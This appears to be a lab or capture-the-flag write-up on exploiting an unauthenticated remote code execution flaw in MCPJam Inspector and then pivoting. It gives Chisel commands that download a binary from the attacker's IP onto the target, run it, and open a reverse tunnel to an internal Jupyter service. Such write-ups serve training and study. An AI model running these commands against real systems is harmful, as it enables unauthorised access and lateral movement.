Initial Access - MCPJam RCE

Vulnerability Discovery

The MCPJam Inspector version v1.4.2 is vulnerable to CVE-2026-23744 - an unauthenticated Remote Code Execution vulnerability.

Vulnerability Details:

  • MCPJam binds to 0.0.0.0 instead of 127.0.0.1
  • /api/mcp/connect endpoint accepts arbitrary commands
  • No authentication required
  • Direct command execution on the host

Step 2: Chisel Port Forwarding

Jupyter is bound to 127.0.0.1:8888 (localhost only). Need to tunnel it to attacker machine.

On Attacker Machine - Start Chisel Server:

# Download chisel if needed
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

# Start chisel server
./chisel server -p 8000 --reverse

On Target (mcp-dev shell) - Connect Back:

# Download chisel from attacker
wget http://10.10.14.223:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel

# Create reverse tunnel
/tmp/chisel client 10.10.14.223:8000 R:8888:127.0.0.1:8888
